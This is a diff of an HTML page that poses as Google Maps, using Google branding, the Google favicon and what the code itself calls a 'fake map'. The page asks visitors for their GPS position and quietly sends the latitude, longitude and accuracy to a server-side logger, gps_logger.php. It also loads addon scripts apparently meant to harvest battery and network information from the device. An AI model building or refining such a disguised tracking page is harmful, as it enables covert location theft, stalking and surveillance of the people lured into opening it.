@@ -1,33 +1,127 @@
-<!-- index.html -->
+<!-- public/index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Google Maps</title>
-  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+  <!-- Favicon -->
   <link rel="icon" href="https://www.google.com/favicon.ico">
+
+  <!-- Leaflet.js for interactive fake map -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha512-o3DRKi7PUxZmhEtPQosGL+JefO3Fa6Koc1hnbP3wYvJ39OKwhvBRkgK6i0rJfFEWZsWgYYuqRWKx6Z2N1jTDgA=="
+    crossorigin=""/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+    integrity="sha512-o1A81HBk0nUNuQZwNSHg1dqY6cC2nZ+XwM4PQf+9D8vU6Cw8DnN+FGhPKjcwU+3o1HDCKozu0ljKkW+L9ar+Hw=="
+    crossorigin=""></script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f1f3f4;
+    }
+
+    .top-bar {
+      background-color: #4285f4;
+      color: white;
+      padding: 12px 20px;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+    }
+
+    .search-bar {
+      flex: 1;
+      margin-left: 20px;
+    }
+
+    .search-bar input {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .map-container {
+      width: 100%;
+      height: calc(100vh - 60px);
+    }
+
+    #map {
+      width: 100%;
+      height: 100%;
+    }
+
+    #status {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      background: rgba(255,255,255,0.9);
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Google Maps</h2>
-  <p>Loading the map for your location...</p>
-  <div id="status">Acquiring GPS and device info...</div>
 
-<script>
-navigator.geolocation.getCurrentPosition(function(position) {
-    fetch('/server/gps_logger.php', {
+  <div class="top-bar">
+    <strong>Google Maps</strong>
+    <div class="search-bar">
+      <input type="text" placeholder="Search Google Maps">
+    </div>
+  </div>
+
+  <div class="map-container">
+    <div id="map"></div>
+    <div id="status">Acquiring GPS and device info...</div>
+  </div>
+
+  <script>
+    // Load a dummy interactive map
+    var map = L.map('map').setView([20.5937, 78.9629], 5); // Default center: India
+
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
+
+    // Request user's GPS and send to logger
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Update map to user location
+      map.setView([lat, lon], 15);
+      L.marker([lat, lon]).addTo(map).bindPopup("You are here").openPopup();
+
+      // Send location to server
+      fetch('/server/gps_logger.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
+          latitude: lat,
+          longitude: lon,
+          accuracy: position.coords.accuracy
         })
+      });
+
+      document.getElementById("status").innerText = "Location acquired.";
+    }, function(err) {
+      document.getElementById("status").innerText = "Failed to get location.";
     });
-});
-</script>
-<script src="addons/battery_sensor.js"></script>
-<script src="addons/gps_retry.js"></script>
-<script src="addons/network_info.js"></script>
+  </script>
+
+  <!-- Your Addon Scripts -->
+  <script src="addons/battery_sensor.js"></script>
+  <script src="addons/gps_retry.js"></script>
+  <script src="addons/network_info.js"></script>
 
 </body>
 </html>
